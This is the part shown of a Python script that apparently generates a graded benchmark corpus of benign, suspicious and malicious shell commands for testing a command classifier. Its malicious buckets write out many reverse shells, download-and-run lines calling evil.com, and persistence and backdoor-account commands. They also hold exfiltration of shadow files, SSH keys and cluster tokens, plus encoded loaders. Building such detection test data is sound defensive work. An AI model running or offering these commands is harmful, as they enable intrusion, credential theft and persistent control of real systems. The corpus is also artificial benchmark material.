        'echo "attacker::0:0:root:/root:/bin/bash" >> /etc/passwd',
        'curl -fsSL http://evil.com/rootkit.ko -o /tmp/rootkit.ko && insmod /tmp/rootkit.ko',
        'wget -q http://evil.com/coinminer -O /tmp/coinminer && chmod +x /tmp/coinminer && /tmp/coinminer',
        'echo "* * * * * root wget -qO- http://evil.com/c.sh | bash" > /etc/cron.d/system-update',
        'printf "#!/bin/sh\\ncurl -fsSL http://evil.com/p.sh | bash\\n" > /etc/profile.d/zz-update.sh && chmod +x /etc/profile.d/zz-update.sh',
        'python3 -m http.server 0.0.0.0 4444 --directory /etc',
        'tar czf /tmp/creds.tgz /etc/passwd /etc/shadow 2>/dev/null && curl -T /tmp/creds.tgz http://10.0.0.5:8080/',
        'rm -f /var/log/wtmp /var/log/btmp',
        'echo 0 > /proc/sys/kernel/randomize_va_space',
        'setenforce 0',
    ])

    return finalize_bucket(bucket, 100, 'malicious_easy')


def build_malicious_medium() -> list[str]:
    bucket: list[str] = []
    seen: set[str] = set()

    push_unique(bucket, seen, [
        'john /tmp/crackme --wordlist=/usr/share/wordlists/rockyou.txt',
        'nmap -sS -p- 192.168.1.0/24', 'nmap -sV --script=vuln 10.0.0.5',
        'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.5',
        'sqlmap -u "http://target.com/page?id=1" --dbs', 'nikto -h http://target.com',
        'msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; run"',
        'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"',
        'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d C:\\temp\\payload.exe',
        'schtasks /create /tn "Updater" /tr "powershell -ep bypass -f C:\\temp\\payload.ps1" /sc onlogon',
        'wmic process call create "cmd /c powershell -ep bypass -nop -w hidden -c IEX(wget http://evil.com/s)"',
        'find / -perm -4000 -type f 2>/dev/null', 'tcpdump -i eth0 -w /tmp/capture.pcap',
        'ettercap -T -q -i eth0 -M arp:remote /10.0.0.1// /10.0.0.254//',
        'arpspoof -i eth0 -t 10.0.0.1 10.0.0.254', 'responder -I eth0 -wrf',
        'linpeas.sh', './pspy64', 'chisel client 10.0.0.1:8080 R:1080:socks', 'ssh -D 1080 -fNq user@10.0.0.1',
    ])

    hosts = ['10.0.0.5', '10.0.0.10', '192.168.1.25', '172.16.0.8']
    for host in hosts:
        push_unique(bucket, seen, [
            f'nmap -sV --script=vuln {host}',
            f'hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{host}',
            f'nikto -h http://{host}',
            f'sqlmap -u "http://{host}/app.php?id=1" --batch --dbs',
        ])

    windows_payloads = [
        'certutil -urlcache -split -f http://evil.com/stager.dll C:\\Users\\Public\\stager.dll',
        'bitsadmin /transfer nightly /download /priority high http://evil.com/agent.exe C:\\Users\\Public\\agent.exe',
        'schtasks /create /tn "WindowsUpdateSvc" /tr "C:\\Users\\Public\\agent.exe" /sc onstart',
        'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v ChromeUpdater /t REG_SZ /d C:\\Users\\Public\\agent.exe',
        'wmic process call create "cmd.exe /c certutil -urlcache -split -f http://evil.com/x.exe C:\\Temp\\x.exe && C:\\Temp\\x.exe"',
    ]
    push_unique(bucket, seen, windows_payloads)

    persistence = [
        'echo "@hourly /usr/bin/curl -fsSL http://evil.com/beacon | bash" > /etc/cron.d/sys-health',
        'systemctl enable malicious-agent.service',
        'systemctl link /tmp/agent.service && systemctl start agent.service',
        'cp /bin/bash /usr/local/bin/.svc && chmod u+s /usr/local/bin/.svc',
        'ln -sf /bin/bash /tmp/sh && chmod u+s /tmp/sh',
    ]
    push_unique(bucket, seen, persistence)

    encoded = [
        'powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA',
        'cmd /c powershell -ep bypass -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=',
        'bash -c "$(echo Y3VybCBodHRwOi8vZXZpbC5jb20vc2g= | base64 -d)"',
        'python3 -c "import base64,os;os.system(base64.b64decode(\"Y3VybCBodHRwOi8vZXZpbC5jb20vc2g=\").decode())"',
        'perl -MMIME::Base64 -e "system(decode_base64(\"Y3VybCBodHRwOi8vZXZpbC5jb20vc2g=\"))"',
        'openssl enc -base64 -d -in /tmp/payload.b64 | bash',
        'certutil -decode payload.txt payload.exe && payload.exe',
        'base64 -d /tmp/loader.b64 > /tmp/loader && chmod +x /tmp/loader && /tmp/loader',
        'printf Y3VybCBodHRwOi8vZXZpbC5jb20vc2g= | base64 -d | bash',
        'eval $(printf Y3VybCBodHRwOi8vZXZpbC5jb20vc2g= | base64 -d)',
    ]
    push_unique(bucket, seen, encoded)

    exfil = [
        'tar cz /etc /root/.ssh | curl -X POST http://10.0.0.5:8080/upload --data-binary @-',
        'rsync -avz /etc/ssh/ user@10.0.0.5:/srv/.cache/ssh/',
        'scp /root/.ssh/id_rsa user@10.0.0.5:/srv/.cache/',
        'kubectl exec deploy/api -- sh -c "cat /var/run/secrets/kubernetes.io/serviceaccount/token" | curl -X POST http://10.0.0.5:8080/token --data-binary @-',
        'docker exec web sh -c "tar cz /app/.env /app/config" | nc 10.0.0.1 4444',
        'openssl enc -aes-256-cbc -salt -in /etc/shadow -out /tmp/shadow.enc -k secret && curl -T /tmp/shadow.enc http://10.0.0.5:8080/',
        'tar czf /tmp/kube.tgz /etc/kubernetes 2>/dev/null && scp /tmp/kube.tgz user@10.0.0.5:/tmp/',
        'find /home -name "id_rsa" 2>/dev/null | tar cz -T - | curl -X PUT http://10.0.0.5:8080/ssh-keys --data-binary @-',
        'cat /etc/passwd /etc/shadow 2>/dev/null | gzip | curl -X POST http://10.0.0.5:8080/creds --data-binary @-',
        'tar cz /var/lib/postgresql /srv/app/config 2>/dev/null | ssh user@10.0.0.5 "cat > /tmp/db-config.tgz"',
    ]
    push_unique(bucket, seen, exfil)

    offensive_ops = ['10.0.0.31', '10.0.0.32', '10.0.0.33', '10.0.0.34', '10.0.0.35']
    for host in offensive_ops:
        push_unique(bucket, seen, [
            f'nmap -sV --script=vuln {host}',
            f'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{host}',
            f'sqlmap -u "http://{host}/index.php?id=1" --batch --dump',
            f'nikto -h http://{host}',
            f'chisel client {host}:8080 R:1080:socks',
            f'ssh -D 1080 -fNq user@{host}',
        ])

    linux_persist = [
        'echo "@reboot /usr/local/bin/.svc" | crontab -',
        'printf "[Unit]\\nDescription=Agent\\n[Service]\\nExecStart=/usr/local/bin/.svc\\n[Install]\\nWantedBy=multi-user.target\\n" > /etc/systemd/system/agent.service && systemctl enable agent.service',
        'cp /bin/bash /usr/local/sbin/.agent && chmod 4755 /usr/local/sbin/.agent',
        'echo "Defaults !authenticate" >> /etc/sudoers',
        'usermod -aG sudo backdoor',
    ]
    push_unique(bucket, seen, linux_persist)

    return finalize_bucket(bucket, 100, 'malicious_medium')


def build_malicious_hard() -> list[str]:
    bucket: list[str] = []
    seen: set[str] = set()

    push_unique(bucket, seen, [
        'perl -e \'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");\'',
        'ruby -rsocket -e\'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
        'php -r \'$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'',
        'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444',
        'openssl s_client -quiet -connect 10.0.0.1:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445',
        'base64 -d <<< "Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo" | bash',
        'eval $(echo "Y3VybCBodHRwOi8vZXZpbC5jb20vcGF5bG9hZCB8IGJhc2g=" | base64 -d)',
        'xterm -display 10.0.0.1:1 -e /bin/bash',
        'python3 -c "import pty; pty.spawn(\'/bin/bash\')"',
        'mkfifo /tmp/p; /bin/sh -i </tmp/p 2>&1 | nc 10.0.0.1 4444 >/tmp/p',
        'tar cz /etc /root/.ssh | openssl enc -aes-256-cbc -k secret | curl -X PUT http://10.0.0.5/upload --data-binary @-',
        'kubectl exec -n kube-system deploy/coredns -- sh -c "curl http://evil.com/ks.sh | sh"',
        'docker exec web sh -c "wget -qO- http://evil.com/dropper | sh"',
        'systemd-run --unit updater.service /bin/bash -c "curl http://evil.com/u.sh | bash"',
        'printf "[Service]\\nExecStart=/bin/bash -c \\\"curl http://evil.com/a.sh | bash\\\"\\n" > /etc/systemd/system/updater.service && systemctl enable updater.service',
        'regsvr32 /s /u /i:http://evil.com/file.sct scrobj.dll',
        'mshta http://evil.com/payload.hta',
        'rundll32 javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://evil.com/p.sct")',
        'bash -c "X=$(printf Y3VybCBodHRwOi8vZXZpbC5jb20vc2g=);eval $(echo $X | base64 -d)"',
        'python3 -c "import base64,os;os.system(base64.b64decode(\"Y3VybCBodHRwOi8vZXZpbC5jb20vc2g=\").decode())"',
    ])

    c2_hosts = ['10.0.0.1', '10.0.0.5', '172.16.0.9', '192.168.1.44', '203.0.113.10']
    for host in c2_hosts:
        push_unique(bucket, seen, [
            f'ssh -D 1080 -fNq user@{host} && proxychains curl http://{host}:8080/beacon',
            f'chisel client {host}:8080 R:9001:socks',
            f'openssl s_client -quiet -connect {host}:4444 | /bin/sh',
        ])

    stealth_persistence = [
        'mkdir -p ~/.config/systemd/user && printf "[Service]\\nExecStart=/bin/bash -c \\\"curl http://evil.com/u.sh | bash\\\"\\n" > ~/.config/systemd/user/dbus-update.service && systemctl --user enable dbus-update.service',
        'echo "export PROMPT_COMMAND=\"curl -fsSL http://evil.com/p.sh | bash\"" >> ~/.bashrc',
        'echo "alias ls=\"/bin/bash -c \\\"curl -fsSL http://evil.com/l.sh | bash\\\"\"" >> ~/.bashrc',
        'echo "* * * * * root curl -fsSL http://evil.com/r.sh | bash" > /etc/cron.d/rsys-update',
        'cp /usr/bin/ssh /usr/local/bin/.sshd && chmod u+s /usr/local/bin/.sshd',
    ]
    push_unique(bucket, seen, stealth_persistence)

    exfil_jobs = [
        '/etc/ssh', '/root/.ssh', '/home/*/.ssh', '/var/lib/postgresql', '/srv/app/config',
        '/etc/kubernetes', '/var/lib/kubelet', '/etc/systemd/system', '/etc/pam.d', '/opt/secrets',
    ]
    for source in exfil_jobs:
        push_unique(bucket, seen, [
            f'tar cz {source} 2>/dev/null | curl -X PUT http://10.0.0.5:8080/store/{Path(source).name}.tgz --data-binary @-',
            f'rsync -avz {source} operator@10.0.0.5:/srv/.cache/{Path(source).name}/ 2>/dev/null',
        ])

    advanced = [
        'LD_PRELOAD=/tmp/evil.so ssh user@10.0.0.1',
        'export PROMPT_COMMAND="curl -fsSL http://evil.com/p.sh | bash"',
        'echo "PATH=/tmp/.bin:$PATH" >> ~/.profile && cp /bin/bash /tmp/.bin/ls && chmod +x /tmp/.bin/ls',
        'bash -c "for x in $(seq 1 3); do curl -fsSL http://evil.com/$x.sh | bash; done"',
        'python3 -c "import os,base64;os.system(base64.b64decode(\"Y3VybCBodHRwOi8vZXZpbC5jb20vc2g=\").decode())"',
        'kubectl create secret generic exfil --from-file=/etc/kubernetes/admin.conf',
        'kubectl exec deploy/web -- sh -c "wget -qO- http://evil.com/a.sh | sh"',
        'docker exec web sh -c "echo attacker:x:0:0::/root:/bin/sh >> /etc/passwd"',
        'tar cz /etc /root /home 2>/dev/null | openssl enc -aes-256-cbc -k secret | ssh user@10.0.0.5 "cat > /tmp/host.tgz.enc"',
        'systemctl edit sshd --full',
        'cp /usr/bin/ssh /tmp/.sshd && chmod u+s /tmp/.sshd',
        'chmod 4755 /usr/local/bin/maintenance-helper',
        'reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe /v Debugger /t REG_SZ /d cmd.exe',
        'schtasks /create /tn "ChromeUpdate" /tr "cmd /c certutil -urlcache -split -f http://evil.com/a.exe C:\\ProgramData\\a.exe && C:\\ProgramData\\a.exe" /sc minute /mo 30',
        'wmic startup list brief && reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OneDriveSync /d C:\\ProgramData\\sync.exe',
        'powershell -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/ps1\')"',
        'mshta vbscript:Close(Execute("GetObject(\"script:http://evil.com/p.sct\")"))',
        'rundll32.exe advpack.dll,LaunchINFSection http://evil.com/payload.inf,DefaultInstall',
        'certutil -urlcache -split -f http://evil.com/payload.b64 payload.b64 && certutil -decode payload.b64 payload.exe && payload.exe',
        'for /f %i in (hosts.txt) do @psexec \\%i -s cmd /c powershell -enc SQBFAFgA',
    ]
    push_unique(bucket, seen, advanced)

    stealth_c2 = ['10.0.0.41', '10.0.0.42', '10.0.0.43', '10.0.0.44', '10.0.0.45']
    for host in stealth_c2:
        push_unique(bucket, seen, [
            f'ssh -D 9050 -fNq user@{host} && proxychains wget -qO- http://{host}:8080/s.sh | bash',
            f'openssl s_client -quiet -connect {host}:4444 | /bin/bash | openssl s_client -quiet -connect {host}:4445',
            f'chisel client {host}:8080 R:8443:127.0.0.1:443',
            f'tar cz /etc /root/.ssh 2>/dev/null | curl -X PUT http://{host}:8080/store/host.tgz --data-binary @-',
        ])

    living_off_land = [
        'bash -c "B=$(cat /etc/shadow 2>/dev/null | base64 -w0); curl -X POST http://10.0.0.5:8080/shadow -d $B"',
        'python3 -c "import os,pty,socket;s=socket.socket();s.connect((\'10.0.0.5\',4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\'/bin/bash\')"',
        'perl -e \'use MIME::Base64;system(decode_base64("Y3VybCBodHRwOi8vZXZpbC5jb20vYS5zaA=="))\'',
        'kubectl exec deploy/api -- sh -c "cat /app/.env | curl -X POST http://10.0.0.5:8080/env --data-binary @-"',
        'docker exec db sh -c "tar cz /var/lib/postgresql/data" | ssh user@10.0.0.5 "cat > /tmp/db.tgz"',
        'systemctl set-environment LD_PRELOAD=/tmp/x.so',
        'printf "\\nPermitRootLogin yes\\nPasswordAuthentication yes\\n" >> /etc/ssh/sshd_config && systemctl restart sshd',
        'useradd -o -u 0 -g 0 -M svc-backup && echo "svc-backup::0:0::/root:/bin/bash" >> /etc/passwd',
        'echo "* * * * * root /bin/bash -c \"curl -fsSL http://evil.com/r.sh | bash\"" > /etc/cron.d/.dbus-update',
        'mv /usr/bin/sudo /usr/bin/.sudo && cp /bin/bash /usr/bin/sudo && chmod 4755 /usr/bin/sudo',
    ]
    push_unique(bucket, seen, living_off_land)

    return finalize_bucket(bucket, 100, 'malicious_hard')


def build_corpus() -> dict[tuple[str, str], list[str]]:
    return {
        ('easy', 'benign'): build_benign_easy(),
        ('medium', 'benign'): build_benign_medium(),
        ('hard', 'benign'): build_benign_hard(),
        ('easy', 'suspicious'): build_suspicious_easy(),
        ('medium', 'suspicious'): build_suspicious_medium(),
        ('hard', 'suspicious'): build_suspicious_hard(),
        ('easy', 'malicious'): build_malicious_easy(),
        ('medium', 'malicious'): build_malicious_medium(),
        ('hard', 'malicious'): build_malicious_hard(),
    }


def write_corpus(output_path: Path) -> None:
    corpus = build_corpus()
    lines: list[str] = []
    label_order = ['benign', 'suspicious', 'malicious']
    difficulty_order = ['easy', 'medium', 'hard']
    for label in label_order:
        lines.append(f'# ===== {label.upper()} =====')
        for difficulty in difficulty_order:
            commands = corpus[(difficulty, label)]
            lines.append(f'# --- {difficulty.upper()} ({label}) ---')
            for command in commands:
                lines.append(f'{difficulty}|{label}|{command}')
            lines.append('')
    output_path.write_text('\n'.join(lines).rstrip() + '\n', encoding='utf-8')

    counts = Counter((difficulty, label) for difficulty, label in corpus.keys())
    print(f'Wrote graded corpus to {output_path}')
    for label in label_order:
        for difficulty in difficulty_order:
            size = len(corpus[(difficulty, label)])
            print(f'  {difficulty:<6} {label:<10} {size:>3}')
    print(f'  total             {sum(len(v) for v in corpus.values()):>3}')


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description='Generate the graded 3-class benchmark corpus.')
    parser.add_argument(
        '--output',
        default=str(Path(__file__).with_name('test_commands_graded.txt')),
        help='Path to write the graded corpus file.',
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    write_corpus(Path(args.output))


if __name__ == '__main__':
    main()